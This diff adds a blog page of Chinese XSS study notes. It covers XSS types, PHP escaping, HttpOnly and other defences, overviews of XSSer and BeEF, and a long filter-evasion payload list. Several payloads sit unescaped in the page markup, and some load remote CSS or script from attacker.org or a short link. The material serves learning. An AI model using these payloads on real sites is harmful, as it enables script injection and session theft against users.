@@ -1,0 +1,776 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="Hexo" href="http://odiws.github.io/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="Hexo" href="http://odiws.github.io/atom.xml" />
+<link rel="alternate" type="application/json" title="Hexo" href="http://odiws.github.io/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="xss" />
+
+
+<link rel="canonical" href="http://odiws.github.io/2024/03/31/xss%E7%AC%94%E8%AE%B0/">
+
+
+
+  <title>
+xss漏洞学习笔记 - 学习笔记 |
+Yume Shoka = Hexo</title>
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">xss漏洞学习笔记
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="Created: 2024-03-31 14:08:54">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">Posted on</span>
+    <time itemprop="dateCreated datePublished" datetime="2024-03-31T14:08:54+08:00">2024-03-31</time>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="Toggle navigation bar">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">Yume Shoka</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gicli9lfebj20zk0m84qp.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gicm0fdw5cj20zk0m8hdt.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclil3m4ej20zk0m8tn8.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giciundwu5j20zk0m8n9e.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gicitf0kl1j20zk0m87fe.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclfw2t96j20zk0m8x6p.jpg"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">Home</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="item" rel="index" title="In 学习笔记"><span itemprop="name">学习笔记</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
+  <link itemprop="mainEntityOfPage" href="http://odiws.github.io/2024/03/31/xss%E7%AC%94%E8%AE%B0/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="odiws">
+    <meta itemprop="description" content=", ">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="Hexo">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <pre><code>                              xss漏洞学习笔记
+</code></pre>
+<p>xss 实质是指 html 和 javascript 代码的注入</p>
+<pre><code>XSS被恶意使用的三种方法：
+</code></pre>
+<p>1. 窃取 Cookie 值<br>
+ 2. 通过 JavaScript 攻击<br>
+ 3. 篡改网页</p>
+<p>xss 的分类：<br>
+按形式分：反射型 XSS 存储型 XSS<br>
+ 按介质分：JSXSS FlashXSS<br>
+ 按接口分：DOM base XSS , 非 DOM XSS<br>
+ 注：因此没有反射型 XSS、存储型 XSS、DOM XSS 这种分类，因为分类依据都不同…</p>
+<p>1. 反射型：（不持久型 xss）<br>
+与服务器交互，但是交互的数据一般不会被存放在数据库中，一次性，所见即所得，一般出现在查询类页面上等。</p>
+  <!--  一般是<script>alert(123)</script>   -->
+<ol start="2">
+<li>存储型：（持久型 xss）<br>
+交互的数据会被存放在数据库中，永久性存储，一般出现在留言板，注册等页面。 <!--一般是#<a href='' onclick=alert('xss')>click</a>    -->
+</li>
+</ol>
+<p>3.DOM 型：<br>
+不与后台服务器产生数据交互，是一种通过 DOM 操作前端代码输出的时候产生的漏洞，大部分属于反射型，少部分属于存储型。</p>
+<p>xss 可能存在的漏洞：<br>
+有用户输入输出的地方，用户交互等一些地方，都可能存在 xss 漏洞。</p>
+<p>PHP 转义函数：</p>
+<p>htmlspecialchars($String, $quote_style, $charset)</p>
+<p>$string ：转换对象字符串</p>
+<p>$quote_style：转换方法。</p>
+<p>转换前	转换后	ENT_NOQUOTES	ENT_COMPAT	ENT_QUOTES<br>
+&lt;	          &amp;lt；	支持 	                     支持 	               支持</p>
+<blockquote>
+<pre><code>        &amp;gt；	支持 	                     支持         	       支持
+</code></pre>
+</blockquote>
+<p>&amp;	        &amp;amp；	支持	                             支持                   支持<br>
+ &quot;	        &amp;quot；	不支持	                     支持 	               支持<br>
+’	        &amp;#39；	不支持	                   不支持	               支持<br>
+一般使用最后一种即可：ENT_QUOTES</p>
+<p>$charset：字符编码。如 UTF-8、GBK。</p>
+<p>payload：&lt;!–<br>
+# 第一类：Javascript URL<br>
+<span class="exturl" data-url="amF2YXNjcmlwdDphbGVydCgndGVzdCcp">link</span><br>
+<a href="java&#115;cript:alert('xss')">link</a><br>
+<a href='vbscript:MsgBox("XSS")'>link</a><br>
+<span class="exturl" data-url="dmJzY3JpcHQ6YWxlcnQoMSk=">Hello</span><br>
+<a href="vbscript&#058;alert(1)">Hello</a><br>
+<a href=javascript:alert(&quot;XSS&quot;)>link</a><br>
+&lt;a href= <code>javascript:alert(&quot;RSnake says,'XSS'&quot;)</code> &gt;link</a><br>
+<a href=javascript:alert(String.fromCharCode(88,83,83))>link</a><br>
+<a href="javascript&colon;alert(1)">link</a><br>
+<a href="javaSCRIPT&colon;alert(1)">Hello</a><br>
+<a href="javasc&NewLine;ript&colon;alert(1)">link</a><br>
+<a href="javas&Tab;cript:\u0061lert(1);">Hello</a><br>
+<a href="jav    ascript:alert('XSS')">link</a><br>
+<a href="jav&#x09;ascript:alert('XSS')">link</a><br>
+<a href="jav&#x0D;ascript:alert('XSS')">link</a><br>
+<a href=" &#14;  javascript:alert('XSS');">link</a><br>
+<span class="exturl" data-url="amF2YXNjcmlwdDpcdTAwNjFsZXJ0JiN4Mjg7MSYjeDI5">Hello</span><br>
+<span class="exturl" data-url="amF2YXNjcmlwdDpjb25maXJtYDFg">link</span><br>
+<span class="exturl" data-url="amF2YXNjcmlwdDpjb25maXJtKDEp">link</span><br>
+<a href="j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1)">1</a><br>
+<span class="exturl" data-url="amF2YXNjcmlwdDolNjElNmMlNjUlNzIlNzQlMjglMzElMjk=">link</span><br>
+<span class="exturl" data-url="amF2YXNjcmlwdDpcdTAwNjFcdTAwNkNcdTAwNjVcdTAwNzJcdTAwNzQoMSk=">link</span><br>
+&lt;a href=javascript:eval(&quot;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&quot;)&gt;2</a><br>
+&lt;a href=javascript:eval(“alert(‘xss’)”)&gt;link</a><br>
+<a href=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>link</a><br>
+<a href=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>link</a><br>
+<a href=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>link</a><br>
+<span class="exturl" data-url="ZGF0YTp0ZXh0L2h0bWw7YmFzZTY0LGFtRjJZWE5qY21sd2REcGhiR1Z5ZENneEtRPT0=">test</span><br>
+<a href=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+>1</a><br>
+&lt;iframe/src=“data:text/html;	base64
+,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==”&gt;</p>
+<p>#第二类：CSS import</p>
+<style>@import url("http://attacker.org/malicious.css");</style>
+<style>@imp\ort url("http://attacker.org/malicious.css");</style>
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+<STYLE>@import'http://jb51.net/xss.css';</STYLE>
+<p>#第三类：Inline style</p>
+<div style="color: expression(alert('XSS'))">
+<div style=color:expression\(alert(1))></div> 
+<div style="color: '<'; color: expression(alert('XSS'))">
+<div style=X:expression(alert(/xss/))>
+<div style="x:\65\78\70\72\65\73\73\69\6f\6e(alert(1))">
+<div style="x:\000065\000078\000070\000072\000065\000073\000073\000069\00006f\00006e(alert(1))">
+<div style="x:\65\78\70\72\65\73\73\69\6f\6e\028 alert \028 1 \029 \029">
+<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+<div style="z:exp/*anything*/res/*here*/sion(alert(1))">
+<div style=xss:expr/*XSS*/ession(alert('XSS'))>
+</XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
+</XSS/*-*/STYLE=xss:e/**/xpression(window.location="http://www.baidu.com")> 
+<img STYLE="background-image:url(javascript:alert('XSS'))"> //ie6  
+<img STYLE="background-image:\75\72\6c\28\6a\61\76\61\73\63\72\69\70\74\3a\61\6c\65\72\74\28\27\58\53\53\27\29\29"> 
+<A STYLE='no\xss:noxss("*//*");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
+<p>#第四类：JavaScript 事件</p>
+<div onclick="alert('xss')">
+<div onmouseenter="alert('xss')">
+<div onclick ="alert('xss')">
+<BODY ONLOAD=alert('XSS')>
+<img data-src=1 onerror=alert(1)>
+<img/src='1'/onerror=alert(0)>
+<img data-src="1" onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;" />
+<img data-src=1 alt=al lang=ert onerror=top[alt+lang](0)>
+<img data-src="1" onerror=eval("\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29")></img>
+<img data-src=1 onmouseover=alert('xss') a1=1111> 
+<img data-src=x onerror=s=createElement('script');body.appendChild(s);s.src='http://t.cn/R5UpyOt';>
+<a href="#" onclick=alert('\170\163\163')>test</a>
+<a href="#" onclick="\u0061\u006C\u0065\u0072\u0074(1)">link</a>
+<a href="#" onclick="\u0061\u006C\u0065\u0072\u0074`a`">link</a>
+<a href="#" onclick="alert(&#039;xss&#039;)">link</a>
+<marquee onscroll=alert(1)> test</marquee>
+<div  style="width:100px;height:100px;overflow:scroll" onscroll="alert('a')">123456 <br/><br/><br/><br/><br/></div>
+<DIV onmousewheel="alert('a')" >123456</DIV><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/>
+<div style="background-color:red" onmouseenter="alert('a')">123456</div>
+<DIV onmouseleave="alert('1')">123456</DIV>
+<div contentEditable="true" style="background-color:red" onfocusin="alert('a')" >asdf</div>
+<div contentEditable="true" style="background-color:red" onfocusout="alert('bem')" >asdf</div>
+<marquee onstart="alert('a')" >asdf</marquee>
+<div style="background-color:red;" onbeforecopy="alert('a')" >asdf</div>
+<div style="background-color:red;" onbeforecut="alert('a')" >asdf</div>
+<div style="background-color:red;" contentEditable="true" onbeforeeditfocus="alert('a')" >asdf</div>
+<div style="background-color:red;" ="true" onbeforepaste="alert('a')" >asdf</div>
+<div style="background-color:red;" oncontextmenu="alert('a')" >asdf</div>
+<div style="background-color:red;" oncopy="alert('a')" >asdf</div>
+<div contentEditable="true" style="background-color:red;" oncut="alert('a')" >asdf</div>
+<div style="background-color:red;" ondrag="alert('1')" >asdf</div>
+<div style="background-color:red;" ondragend="alert('a')" >asdf</div>
+<div style="background-color:red;" ondragenter="alert('b')" >asdf</div>
+<div contentEditable="true" style="background-color:red;" ondragleave="alert('a')" >asdf</div>
+<div contentEditable="true" style="background-color:red;" ondragover="alert('b')" >asdf</div>
+<div contentEditable="true" style="background-color:red;" ondragstart="alert('a')" >asdf</div>
+<div contentEditable="true" style="background-color:red;" ondrop="alert('b')" >asdf</div> <div contentEditable="true" style="background-color:green;" ondrop="alert('bem')" >asdf</div>
+<div contentEditable="true" style="background-color:red;" onlosecapture="alert('b')">asdf</div>
+<div contentEditable="true" style="background-color:red;" onpaste="alert('a')" >asdf</div>
+<div contentEditable="true" style="background-color:red;" onselectstart="alert('a')" >asdf</div>
+<div contentEditable="true" style="background-color:red;" onhelp="alert('a')" >asdf</div>
+<div STYLE="background-color:red;behavior:url('#default#time2')" onEnd="alert('a')">asdf</div>
+<div STYLE="background-color:red;behavior:url('#default#time2')" onBegin="alert('a')">asdf</div>
+<div contentEditable="true" STYLE="background-color:red;" onactivate="alert('b')">asdf</div>
+<div contentEditable="true" STYLE="background-color:red;filter: Alpha(opacity=100, style=2);"onfilterchange="alert('b')">asdf</div>
+<div contentEditable="true" onbeforeactivate="alert('b')">asdf</div>
+<div contentEditable="true" onbeforedeactivate="alert('a')">asdf</div>
+<div contentEditable="true" ondeactivate="alert('bem')">asdf</div>
+<video src="http://www.w3schools.com/html5/movie.ogg" onloadedmetadata="alert(1)" />
+<video src="http://www.w3schools.com/html5/movie.ogg" onloadstart="alert(1)" />
+<audio src="http://www.w3schools.com/html5/movie.ogg" onloadstart="alert(1)">
+<audio src="http://www.w3schools.com/html5/movie.ogg" onloadstart="alert(1)"></audio>
+<body onscroll=alert(26)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+<input type="hidden" accesskey="X" onclick="alert(/xss/)">
+<p>#第五类：Script 标签</p>
+<script src="http://baidu.com"></script>
+<script>Function(atob('YWxlcnQoInhzcyIp'))()</script>
+<script>alert("XSS")</script>
+<p>&lt;scr<script>ipt&gt;alert(“XSS”)&lt;/scr<script>ipt&gt;</p>
+<SCRIPT>a=/XSS/ alert(a.source)</SCRIPT>
+<script>alert(/1/.source)</script>
+<script>alert(1);</script>
+<script>prompt(1);</script>
+<script>confirm(1);</script>
+<script>alert(/88199/)</script>
+<script>alert(`a`)</script>
+<script>alert('a')</script>
+<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+<script>eval(alert(1))</script>
+<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 50, 51, 41))</script>
+<script>eval("\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029")</script>
+<script>eval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')</script>
+<script>setTimeout('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')</script>
+<script>setTimeout(alert(1),0)</script>
+<script>setTimeout`alert\x28\x27 xss \x27\x29`</script>
+<script>setInterval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')</script>
+<script src=data:text/javascript,alert(1)></script>
+<script src=&#100&#97&#116&#97:text/javascript,alert(1)></script>
+<script>\u0061\u006C\u0065\u0072\u0074(123)</script>
+<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
+<script>\u0061\u006C\u0065\u0072\u0074`a`</script>
+<script>window['alert'](0)</script>
+<script>parent['alert'](1)</script>
+<script>self['alert'](2)</script>
+<script>top['alert'](3)</script>
+<!--[if]><script>alert(1)</script     -->(该地方-->是要写的，注释就近原则忽略)
+<!--(这是注释符)
+<script>alert("xss");;;;;;;;;;;;;;;;;    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</script>
+<script>$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_$_+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
+<script>(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()</script>
+
+XSS的辅助性对策：
+    输入校验：通过检验输入值的有效性，当输入值不符和条件是就显示错误消息，并促使用户重新输入，有时也能够防御XSS攻击。
+
+    给Cookie添加HttpOnly属性：Cookie中有名为HttpOnly属性，该属性能禁止JavaScript读取Cookie值。
+
+    通过给Cookie添加HttpOnly属性，能够杜绝XSS中窃取会话ID这一典型的攻击手段。但需要注意的是其他攻击手段依然有效，所以这样只能是限制了攻击者的选择范围，并不能杜绝所有的XSS攻击。
+
+    php.init:session.cookie_httponly=On 
+
+XSS对策总结：
+     根本性对策（个别对策）
+
+    HTML的元组内容：使用htmlspecialchars函数转义。
+属性值：使用htmlspecialchars函数转义并用双引号括起来。
+根本性对策（共通对策）
+
+    明确设置HTTL响应的字符编码。
+    辅助对策：
+
+    （a）输入校验
+    （b）给Cookie添加HttpOnly属性。
+
+   HTML组成元素
+
+1.脚本（事件绑定）
+2.事件绑定函数中的字符串字面量
+3.属性值/（URL），属性位置防止双引号。
+4.元素内容，元素位置防止尖角符号。
+5.script元素中南的字符串字面量
+
+    XSSer简介-确认XSS存在的工具
+    XSSer概述：
+跨站点“Scripter”（又名XSSer）是一个自动化框架，用于检测、利用以及报告基于Web应用程序
+中的XSS漏洞。
+
+    XSS是Web应用常见的漏洞。利用该漏洞，安全人员在网站注入恶意脚本，控制用户浏览器，并发起其他渗透操作。XSSer是Kali Linux提供的一款自动化XSS攻击框架。该工具可以同时探测多个网址。如果发现XSS漏洞，可以生成报告，并直接进行利用，如建立反向连接。为了提供攻击效率，该工具支持各种规避措施，如判断XSS过滤器、规避特定的防火墙、编码规避。同时，该工具提供丰富的选项，供用户自定义攻击，如指定攻击载荷、设置漏洞利用代码等。
+
+    一个自动框架、检测，利用和报告基于Web应用的XSS漏洞。
+
+    支持命令行、图形化界面。
+
+    提供绕过服务器过滤的选项，以及一些特殊的代码注入技术。
+
+    XSSer经典命令：
+(a)-u URL, --url=URL  添加URL
+(b)-g Getdata	使用GET提交数据
+(c)-p POSTdata 使用post提交数据
+(d)--cookie=COOKIE 提供cookie信息
+(e)-s, --statistics 显示统计信息
+(f)-v, --verbose 展示详细结果
+(g)--reverse-check 反向连接检查
+
+    BeEF攻击简介
+    BeEF概述：
+通过XSS漏洞，将hook.js脚本注入，可将中招的客户端挂起。
+
+如果客户端浏览器关掉，则连接会断开。
+
+可以做持久化连接。不让用户关闭浏览器，或者后台开一个小窗。
+
+    BeEF（Brower exploitation framerwork）：
+
+1.生成，交付Payload
+2.Ruby语言编写
+3.服务器端：管理Hooked客户端
+4.客户端：运行与客户端浏览器的JS脚本（hook）降低白帽子对JS代码的要求。
+
+    BeEF主要针对浏览器（客户）进行攻击。
+
+    应用普遍转移到B/S架构，浏览器称为唯一客户端程序。
+    结合社会工程学方法对浏览器进行攻击。
+    攻击浏览器用户
+    通过注入的JS脚本，刘勇浏览器工具其他网站
+    BeEF攻击手段：
+1.利用网站XSS漏洞实现攻击
+2.诱使客户端访问包含hook的伪造网站
+3.结合中间人攻击注入hook脚本
+
+    1.软件攻击模块颜色介绍：
+    2- 绿色模块：表示模块适合目标浏览器，并且执行结果客户端不可见
+    3- 红色模块：表示模块不适合目标浏览器，有些红色模块也可正常运行
+    4- 橙色模块：模块可用，但是结果对用户可见（例如：弹窗申请全新等）
+    5- 灰色模块：模块未在目标浏览器测试过
+
+BeEF常见用途：
+1.键盘记录器
+2.网络扫描
+3.浏览器信息收集
+4.绑定shell
+5.与Metasploit集成
+-->
+
+      <div class="tags">
+          <a href="/tags/xss/" rel="tag"><i class="ic i-tag"></i> xss</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">Edited on</span>
+    <time title="Modified: 2024-04-11 21:46:22" itemprop="dateModified" datetime="2024-04-11T21:46:22+08:00">2024-04-11</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> Donate</button>
+  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="odiws WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="odiws Alipay">
+        <p>Alipay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt="odiws PayPal">
+        <p>PayPal</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>Post author:  </strong>odiws <i class="ic i-at"><em>@</em></i>Hexo
+  </li>
+  <li class="link">
+    <strong>Post link: </strong>
+    <a href="http://odiws.github.io/2024/03/31/xss%E7%AC%94%E8%AE%B0/" title="xss漏洞学习笔记">http://odiws.github.io/2024/03/31/xss笔记/</a>
+  </li>
+  <li class="license">
